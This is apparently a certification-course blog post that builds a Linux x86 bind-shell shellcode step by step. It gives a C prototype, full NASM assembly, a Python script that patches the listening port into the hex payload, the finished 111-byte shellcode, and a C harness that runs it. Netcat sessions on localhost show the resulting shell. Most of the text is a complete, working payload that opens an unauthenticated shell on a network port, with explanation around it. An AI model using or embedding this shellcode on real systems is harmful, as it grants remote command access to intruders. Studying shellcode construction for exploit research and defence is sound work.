---
layout: single
title: Creating a Bind Shell TCP Shellcode
date: 2018-09-04
categories:
  - security
  - shellcoding
tags:
  - securitytube
  - slae
---

"Bind shells" are used to spawn a shell on a remote system and provide access to it over a network. At minimum, a bind shell would need to carry out the following tasks:

1. Create a socket and listen for a new connection
2. Spawn a shell when a connection is established
3. Redirect the STDERR, STDIN and STDOUT streams to the new connection

In C, this would look something like this:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main ()
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

Analysis of the C Prototype
---------------------------
The man pages for `socket` (see `man 2 socket`) lists the domains and types that can be used when creating a socket. In this instance, `AF_INET` and `SOCK_STREAM` are used to create an IPv4 socket.

If one follows the reference to the `ip` man pages (see `man 7 ip`), an explanation is also provided of the address struct (`sockaddr_in`) that is needed when calling the `bind` method as well as the `in_addr` struct used within it.

> sin_family is always set to AF_INET. This is required; in Linux 2.2 most networking functions return EINVAL when this setting is missing. sin_port contains the port in network byte order. The port numbers below 1024 are called privileged ports (or sometimes: reserved ports). Only privileged processes (i.e., those having the CAP_NET_BIND_SERVICE capability) may bind(2) to these sockets. Note that the raw IPv4 protocol as such has no concept of a port, they are only implemented by higher protocols like tcp(7) and udp(7).
>
> sin_addr is the IP host address. The s_addr member of struct in_addr contains the host interface address in network byte order. in_addr should be assigned one of the INADDR_* values (e.g., INADDR_ANY) or set using the inet_aton(3), inet_addr(3), inet_makeaddr(3) library functions or directly with the name resolver (see gethostbyname(3)).
>
> ...
>
> Note that the address and the port are always stored  in  network  byte order.  In particular, this means that you need to call htons(3) on the number that is assigned to a port.  All address/port manipulation functions in the standard library work in network byte order.
>
> There are several special addresses: INADDR_LOOPBACK (127.0.0.1) always refers to the local host via the loopback device; INADDR_ANY (0.0.0.0) means any address for binding; INADDR_BROADCAST (255.255.255.255) means any host and has the same effect on bind as INADDR_ANY for historical reasons.

Something that is not mentioned in this documentation but that is of great importance when using the `bind` method from ASM, is that the `sockaddr_in` struct has 8 bytes bytes of padding to ensure at minimum it is the same size as the `sockaddr` struct.

This information can be seen by examining the `sockaddr_in` struct definition in `/usr/include/netinet/in.h`:

```c
/* Structure describing an Internet socket address.  */
struct sockaddr_in
  {
    __SOCKADDR_COMMON (sin_);
    in_port_t sin_port;                 /* Port number.  */
    struct in_addr sin_addr;            /* Internet address.  */

    /* Pad to size of `struct sockaddr'.  */
    unsigned char sin_zero[sizeof (struct sockaddr) -
                           __SOCKADDR_COMMON_SIZE -
                           sizeof (in_port_t) -
                           sizeof (struct in_addr)];
  };
```

Once the socket is bound to a port and address, the program can start to listen for incoming connections. This is done by passing the socket to the `listen` method as well as the number of connections to queue in the backlog. As only one connection will be made / is expected, the backlog argument can be left as `0`.

The man pages for the `accept` method (see `man 2 accept`) indicate that the `addr` and `addrlen` arguments are only required to store the address of the host that connects to the socket and will not be used if `NULL` is specified. As there is no need to store this information, these arguments can be left as `NULL`.

After a connection is accepted, `dup2` is used to make the STDIN, STDERR and STDOUT file descriptors match the file descriptor that was created to communicate with the newly connected client. Doing this ensures that any incoming data will be written to STDIN and that any data coming out of the shell via STDERR and STDOUT will also be sent to the client.

Lastly, `execve` is called to spawn the shell.

Converting the Prototype to Shellcode
-------------------------------------
The first thing that needs to be done is to set the frame pointer and clear the registers that will be immediately used:

```nasm
; set the frame pointer
mov   ebp, esp

; clear required registers
xor   eax, eax
xor   ebx, ebx
xor   ecx, ecx
xor   edx, edx
```

After doing this, the `sockaddr_in` struct can be created on the stack. As mentioned earlier, the struct requires 8 bytes of padding; for this reason, `$eax` is pushed on to the stack twice and then a third time to ensure a value of zero is specified for `s_addr` (i.e. the equivalent of `INADDR_ANY`).

Next, the port number and family need to be pushed on to the stack. Before doing this, the value of `AF_INET` needs to be confirmed. This can be found in `/usr/include/bits/socket.h`. Checking the file will show it is equal to the value of `PF_INET` which is defined as `2`:

```c
#define PF_INET         2       /* IP protocol family.  */
```

Once this value is confirmed, `0x5c11` (port 4444) and `0x02` (`AF_INET`) can be pushed on to the stack to complete the construction of the `sockaddr_in` struct.

```nasm
; create sockaddr_in struct
push  eax
push  eax         ; [$esp]: 8 bytes of padding
push  eax         ; [$esp]: 0
push  word 0x5c11 ; [$esp]: 4444
push  word 0x02   ; [$esp]: AF_INET
```

With the required data prepared on the stack, the socket can be created. In order to call the `socket` method and all other required methods, the system call number will need to be identified within `/usr/include/i386-linux-gnu/asm/unistd_32.h` or `/usr/include/x86_64-linux-gnu/asm/unistd_32.h`.

The value required for `AF_INET` was already identified when creating the `sockaddr_in` struct, but the value of `SOCK_STREAM` still needs to be determined. The definition of `SOCK_STREAM` can be found in `/usr/include/bits/socket_type.h`:

```c
SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
                                 byte streams.  */
#define SOCK_STREAM SOCK_STREAM
```

After calling `socket`, the return value will then be moved into `$edi` for use in further system calls:

```nasm
; call socket(domain, type, protocol)
mov   ax, 0x167   ; $eax: 0x167 / 359
mov   bl, 0x02    ; $ebx: AF_INET
mov   cl, 0x01    ; $ecx: SOCK_STREAM
int   0x80
mov   edi, eax    ; $edi: socket file descriptor
```

Once the socket is created, it needs to be bound to an address and port using the `sockaddr_in` struct that was created earlier. Calling `bind` introduces a new problem that wasn't present in the previous system call, that being that we need to pass the _size_ of the struct to the method (as seen using the `sizeof` method in the C example).

As the struct was the first thing that was pushed on to the stack, the size can be calculated by first moving the frame pointer into `$edx` and then subtracting the current stack pointer from it. As the stack grows in reverse order, from a higher address to a low address, this will result in the total number of bytes in difference being stored in `$edx`:

```nasm
; call bind(sockfd, addr, addrlen)
xor   eax, eax
mov   ax, 0x169   ; $eax: 0x169 / 361
mov   ebx, edi    ; $ebx: sockfd
mov   ecx, esp    ; $ecx: pointer to sockaddr struct
mov   edx, ebp
sub   edx, esp    ; $edx: size of the sockaddr struct
int   0x80
```

Next, we need to start listening for incoming connections and accept them. Calling `listen` introduces no complications, as it is a simple call that passes the socket file descriptor and the value `0` (achieved by XORing the appropriate register):

```nasm
; call listen(sockfd, backlog)
xor   eax, eax
mov   ax, 0x16b   ; $eax: 0x16b / 363
mov   ebx, edi    ; $ebx: sockfd
xor   ecx, ecx    ; $ecx: 0
int   0x80
```

Making the call to `accept`, however, does introduce a minor issue. Looking for the call number for `accept` will return no results. The only call available for use is `accept4`. The `accept4` method works almost identically to `accept`, but just requires an additional argument (`flags`) be specified.

According to the man page for `accept4`:

> If flags is 0, then accept4() is the same as accept()

With this in mind, the appropriate register can be XORd to pass the value `0`. The return value of `accept4` is the file descriptor which will be used to send and receive data over the network, so the return value needs to be moved into `$esi` for later use:

```nasm
; call accept4(sockfd, *addr, *addrlen, flags)
xor   eax, eax
mov   ax, 0x16c   ; $eax: 0x16c / 364
mov   ebx, edi    ; $ebx: sockfd
xor   ecx, ecx    ; $ecx: NULL
xor   edx, edx    ; $edx: NULL
xor   esi, esi    ; $esi: 0
int   0x80
mov   esi, eax    ; $esi: connection file descriptor
```

After accepting the connection, `dup2` is called to ensure STDIN, STDOUT and STDERR and the newly created file descriptor are all equal. Rather than repeat the same code three times, the `loop` instruction is used to reduce the amount of shellcode needed. The file descriptors for STDIN, STDOUT and STDERR are 0, 1 and 2. As `loop` will stop jumping to the specified label (`dup`) once it reaches zero, `0x3` is moved into the `cl` register to ensure a total of 3 iterations.

Each time the call is made to `dup2`, the value of `ecx` is decremented, to ensure a valid file descriptor is being used, and then re-incremented to ensure the loop continues as expected:

```nasm
; call dup2 to redirect STDIN, STDOUT and STDERR
mov   cl, 0x3
dup:
xor   eax, eax
mov   al, 0x3f
mov   ebx, esi    ; $ebx: connection file descriptor
dec   ecx
int   0x80
inc   ecx
loop  dup
```

Finally, with the connection established and the file descriptors setup, `execve` can be used to spawn a shell. As `/bin/sh` is only 7 bytes, if it was to be pushed on to the stack it would result in a null byte also being pushed. To avoid this, an extra slash is added to the path, as this is interpretted the same, but pads the value out to 8 bytes.

As the parameters are pushed in reverse order onto the stack, `$eax` is pushed onto the stack after being XORd before `/bin//sh` to ensure the string is null terminated:

```nasm
; spawn /bin/sh using execve
; $ecx and $edx are 0 at this point
xor   eax, eax
push  eax
push  0x68732f2f
push  0x6e69622f
mov   ebx, esp    ; [$ebx]: null terminated /bin//sh
mov   al, 0x0b
int   0x80
```

The final program will now look like this:

```nasm
global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

    ; create sockaddr_in struct
    push  eax
    push  eax         ; [$esp]: 8 bytes of padding
    push  eax         ; [$esp]: 0
    push  word 0x5c11 ; [$esp]: 4444
    push  word 0x02   ; [$esp]: AF_INET

    ; call socket(domain, type, protocol)
    mov   ax, 0x167   ; $eax: 0x167 / 359
    mov   bl, 0x02    ; $ebx: AF_INET
    mov   cl, 0x01    ; $ecx: SOCK_STREAM
    int   0x80
    mov   edi, eax    ; $edi: socket file descriptor

    ; call bind(sockfd, addr, addrlen)
    xor   eax, eax
    mov   ax, 0x169   ; $eax: 0x169 / 361
    mov   ebx, edi    ; $ebx: sockfd
    mov   ecx, esp    ; $ecx: pointer to sockaddr struct
    mov   edx, ebp
    sub   edx, esp    ; $edx: size of the sockaddr struct
    int   0x80

    ; call listen(sockfd, backlog)
    xor   eax, eax
    mov   ax, 0x16b   ; $eax: 0x16b / 363
    mov   ebx, edi    ; $ebx: sockfd
    xor   ecx, ecx    ; $ecx: 0
    int   0x80

    ; call accept4(sockfd, *addr, *addrlen, flags)
    xor   eax, eax
    mov   ax, 0x16c   ; $eax: 0x16c / 364
    mov   ebx, edi    ; $ebx: sockfd
    xor   ecx, ecx    ; $ecx: NULL
    xor   edx, edx    ; $edx: NULL
    xor   esi, esi    ; $esi: 0
    int   0x80
    mov   esi, eax    ; $esi: connection file descriptor

    ; call dup2 to redirect STDIN, STDOUT and STDERR
    mov   cl, 0x3
    dup:
    xor   eax, eax
    mov   al, 0x3f
    mov   ebx, esi    ; $ebx: connection file descriptor
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
    xor   eax, eax
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp    ; [$ebx]: null terminated /bin//sh
    mov   al, 0x0b
    int   0x80
```

Compiling & Testing
-------------------
To compile the program, run: `nasm -f elf32 bind_tcp.asm && ld -m elf_i386 bind_tcp.o -o bind_tcp`

Once compiled, run the `bind_tcp` executable and attempt to connect to the localhost on port 4444. If successful, it should be possible to execute shell commands as can be seen below:

```shell_session
$ nc -v localhost 4444
Connection to localhost 4444 port [tcp/*] succeeded!
pwd
/home/rastating/Code/slae/assignment_1
netstat -an | grep "4444"
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN     
tcp        0     26 127.0.0.1:56520         127.0.0.1:4444          ESTABLISHED
tcp        0      0 127.0.0.1:4444          127.0.0.1:56520         ESTABLISHED
```

Modifying The Bind Port
-----------------------
As the bind port is always 2 bytes, it is possible to make a helper program to automate this. An example of such program can be found below:

```python
import socket
import sys

code =  ""
code += "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9"
code += "\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11"
code += "\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01"
code += "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7"
code += "\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb"
code += "\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80"
code += "\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb"
code += "\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8"
code += "\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2"
code += "\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03"
code += "\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\x49\\xcd"
code += "\\x80\\x41\\xe2\\xf4\\x31\\xc0\\x50\\x68"
code += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
code += "\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) < 2:
    print 'Usage: python {name} [port_to_bind]'.format(name = sys.argv[0])
    exit(1)

port = hex(socket.htons(int(sys.argv[1])))
code = code.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

print code
```

Running this with a port argument of `65520` results in the following shellcode:

```shell_session
$ python create.py 65520
\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\xff\xf0\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\x49\xcd\x80\x41\xe2\xf4\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

This shellcode can then be used in a small C program to test it, like below:

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    unsigned char code[] = "\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\xff\xf0\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\x49\xcd\x80\x41\xe2\xf4\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

    printf("Shellcode length: %d\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}
```

Assuming this code is placed in a file named `test_shellcode.c`, it can be compiled by running: `gcc -m32 -fno-stack-protector -z execstack test_shellcode.c -o test`. After running the `test` executable, it should show the length of the shellcode, which will be 111 bytes:

```shell_session
$ ./test
Shellcode length: 111
```

Lastly, the previous connection test should be repeatable using port 65520 instead:

```shell_session
$ nc -v localhost 65520
Connection to localhost 65520 port [tcp/*] succeeded!
pwd
/home/rastating/Code/slae/utilities
netstat -an | grep "65520"
tcp        0      0 0.0.0.0:65520           0.0.0.0:*               LISTEN     
tcp        0     27 127.0.0.1:43506         127.0.0.1:65520         ESTABLISHED
tcp        0      0 127.0.0.1:65520         127.0.0.1:43506         ESTABLISHED
```

References
----------
* [https://en.wikipedia.org/wiki/Berkeley_sockets](https://en.wikipedia.org/wiki/Berkeley_sockets)
* [https://linux.die.net/man/7/ip](https://linux.die.net/man/7/ip)
* [https://linux.die.net/man/2/bind](https://linux.die.net/man/2/bind)
* [https://linux.die.net/man/2/socket](https://linux.die.net/man/2/socket)
* [https://linux.die.net/man/2/accept](https://linux.die.net/man/2/accept)
* [https://linux.die.net/man/2/listen](https://linux.die.net/man/2/listen)
* [https://linux.die.net/man/3/htons](https://linux.die.net/man/3/htons)

<hr />

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

Student ID: SLAE-1340

All source files can be found on GitHub at [https://github.com/rastating/slae](https://github.com/rastating/slae)
